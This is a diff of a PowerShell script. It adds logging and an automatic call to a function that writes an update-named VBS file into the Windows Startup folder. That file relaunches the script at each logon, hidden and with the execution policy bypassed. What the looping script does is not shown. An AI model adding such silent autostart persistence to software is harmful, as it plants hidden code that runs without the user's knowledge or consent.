@@ -29,14 +29,16 @@ function Log($msg) {
 }
 
 function Register-Always {
-  if (-not $PSCommandPath) { return }
+  if (-not $PSCommandPath) { Log "startup file NOT saved"; return }
   $startup = [Environment]::GetFolderPath("Startup")
-  if (-not $startup) { return }
+  if (-not $startup -or -not (Test-Path $startup)) { Log "startup file NOT saved"; return }
   $vbs = Join-Path $startup "DiamondSpadersUpdate.vbs"
   $qq = '""'
   $run = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File $qq$PSCommandPath$qq -loop"
   $body = "CreateObject(""Wscript.Shell"").Run ""$run"", 0, False"
-  Set-Content -Path $vbs -Value $body -Encoding ASCII
+  try { Set-Content -Path $vbs -Value $body -Encoding ASCII }
+  catch { Log ("startup file NOT saved " + $_.Exception.Message); return }
+  if (Test-Path $vbs) { Log "startup file saved" } else { Log "startup file NOT saved" }
 }
 
 function Get-LoopPid {
@@ -57,6 +59,8 @@ function Start-LoopIfNeeded {
   Start-Process -FilePath "powershell.exe" -ArgumentList @("-NoProfile","-ExecutionPolicy","Bypass","-WindowStyle","Hidden","-File",$PSCommandPath,"-loop") -WindowStyle Hidden
   Log "it stays running"
 }
+
+Register-Always
 
 if ($args -contains "-loop") {
   if ((Get-LoopPid) -ne 0) { exit 0 }
